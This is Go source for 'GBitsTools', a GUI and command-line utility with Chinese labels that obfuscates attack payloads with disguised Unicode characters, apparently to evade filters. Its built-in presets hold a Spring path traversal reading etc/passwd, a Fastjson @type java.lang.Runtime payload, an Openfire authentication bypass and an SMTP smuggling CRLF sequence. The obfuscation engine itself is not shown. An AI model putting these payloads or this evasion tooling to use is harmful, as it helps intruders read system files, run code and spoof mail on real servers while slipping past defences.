package main

import (
	"flag"
	"fmt"
	"os"
	"strconv"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/driver/desktop"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

type preset struct {
	base    string
	repeat  string
	tail    string
	exempt  string
	mode    string
	unicode bool
}

var presets = map[string]preset{
	"0. 手动自定义":                    {base: "", repeat: "1", tail: "", exempt: "", mode: "0", unicode: false},
	"1. Spring 目录穿越":              {base: ".%u002e/", repeat: "7", tail: "etc/passw%64", exempt: "/", mode: "0", unicode: false},
	"2. Fastjson @type 绕过 (JSON)": {base: `{"@type":"java.lang.Runtime"}`, repeat: "1", tail: "", exempt: `{}":.`, mode: "0", unicode: true},
	"3. Openfire 权限绕过":            {base: "%2>/", repeat: "4", tail: "log.jsp", exempt: "/", mode: "0", unicode: false},
	"4. SMTP 邮件走私":                {base: "[CRLF]DATA[CRLF]Subject: PWNED[CRLF].[CRLF]QUIT", repeat: "1", tail: "", exempt: "", mode: "0", unicode: false},
}

var modeOptions = []string{"0. 常用口水汉字 (GB2312)", "1. 拉丁/希腊/西里尔文", "2. 全字符集乱码"}

func main() {
	if len(os.Args) > 1 {
		runCLI()
	} else {
		runGUI()
	}
}

func runCLI() {
	payload := flag.String("p", "", "基础 Payload (必填)")
	repeat := flag.Int("r", 1, "重复次数 (默认: 1)")
	tail := flag.String("t", "", "尾部明文字符串")
	mode := flag.Int("m", 0, "模式: 0(常用汉字), 1(拉丁/西里尔), 2(随机乱码)")
	exempt := flag.String("e", "", "豁免转换的字符 (如 / 或 {} )")
	unicode := flag.Bool("u", false, "输出为 \\uXXXX 转义格式")

	flag.Parse()

	if *payload == "" {
		fmt.Println("错误: 必须提供基础 Payload (-p)")
		flag.Usage()
		os.Exit(1)
	}

	engine := &GhostBitsEngine{}
	result := engine.Generate(*payload, *repeat, *tail, *mode, *exempt, *unicode)
	fmt.Println(result)
}

func runGUI() {
	a := app.New()
	w := a.NewWindow("GBitsTools")
	w.Resize(fyne.NewSize(680, 520))

	engine := &GhostBitsEngine{}

	baseEntry := widget.NewEntry()
	baseEntry.SetPlaceHolder("输入基础 Payload")
	repeatEntry := widget.NewEntry()
	repeatEntry.SetText("1")
	tailEntry := widget.NewEntry()
	tailEntry.SetPlaceHolder("尾部明文字符串")
	exemptEntry := widget.NewEntry()
	exemptEntry.SetPlaceHolder(`例如: /{}":`)
	modeSelect := widget.NewSelect(modeOptions, nil)
	modeSelect.SetSelected(modeOptions[0])
	unicodeCheck := widget.NewCheck("输出为 \\uXXXX 格式 (适用于 JSON 等)", nil)

	outputEntry := widget.NewEntry()
	outputEntry.MultiLine = true
	outputEntry.Wrapping = fyne.TextWrapWord
	outputEntry.SetPlaceHolder("生成结果将显示在这里...")
	outputEntry.Disable()

	presetKeys := make([]string, 0, len(presets))
	for k := range presets {
		presetKeys = append(presetKeys, k)
	}
	presetSelect := widget.NewSelect(presetKeys, func(s string) {
		p := presets[s]
		baseEntry.SetText(p.base)
		repeatEntry.SetText(p.repeat)
		tailEntry.SetText(p.tail)
		exemptEntry.SetText(p.exempt)
		modeSelect.SetSelected(modeOptions[atoi(p.mode)])
		unicodeCheck.SetChecked(p.unicode)
	})
	presetSelect.SetSelected(presetKeys[1])

	generateBtn := widget.NewButtonWithIcon("生成", theme.MediaPlayIcon(), func() {
		repeat := 1
		if n, err := strconv.Atoi(repeatEntry.Text); err == nil && n >= 1 {
			repeat = n
		}
		mode := modeSelect.SelectedIndex()
		if mode < 0 {
			mode = 0
		}

		result := engine.Generate(
			baseEntry.Text,
			repeat,
			tailEntry.Text,
			mode,
			exemptEntry.Text,
			unicodeCheck.Checked,
		)
		outputEntry.SetText(result)
		outputEntry.Enable()
	})

	copyBtn := widget.NewButtonWithIcon("复制", theme.ContentCopyIcon(), func() {
		text := outputEntry.Text
		if text == "" {
			return
		}
		w.Clipboard().SetContent(text)
		fyne.CurrentApp().SendNotification(&fyne.Notification{
			Title:   "GBitsTools",
			Content: "已复制到剪贴板",
		})
	})

	paramGrid := container.NewGridWithColumns(2,
		widget.NewLabel("基础 Payload"),
		baseEntry,
		widget.NewLabel("重复次数"),
		repeatEntry,
		widget.NewLabel("不混淆的尾部"),
		tailEntry,
		widget.NewLabel("豁免字符(不转换)"),
		exemptEntry,
		widget.NewLabel("伪装字符集"),
		modeSelect,
	)

	btnRow := container.NewHBox(generateBtn, copyBtn)

	outputLabel := widget.NewLabel("生成结果:")

	content := container.NewVBox(
		container.NewVBox(
			widget.NewSeparator(),
			widget.NewLabel("漏洞预设 (一键加载)"),
			presetSelect,
		),
		widget.NewSeparator(),
		widget.NewLabel("载荷构造参数"),
		paramGrid,
		unicodeCheck,
		btnRow,
		widget.NewSeparator(),
		outputLabel,
		outputEntry,
	)

	w.SetContent(container.NewPadded(content))

	if desk, ok := a.(desktop.App); ok {
		desk.SetSystemTrayMenu(fyne.NewMenu("GBitsTools"))
	}

	w.ShowAndRun()
}

func atoi(s string) int {
	n, _ := strconv.Atoi(s)
	return n
}
